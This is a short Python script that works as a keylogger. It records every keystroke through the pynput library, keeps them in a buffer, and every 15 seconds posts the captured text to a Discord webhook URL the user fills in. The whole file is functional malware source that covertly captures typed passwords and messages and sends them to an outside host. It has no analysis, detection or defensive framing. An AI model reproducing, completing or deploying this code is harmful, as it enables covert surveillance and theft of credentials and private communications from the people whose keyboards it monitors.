from pynput import keyboard
import requests
import threading

text = ""

webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE"

time_interval = 15

def send_post_req():
    global text
    try:
        if text:
            message = f"```{text}```"
            r = requests.post(webhook_url, data={"content": message})
            text = ""
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request: {e}")

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()
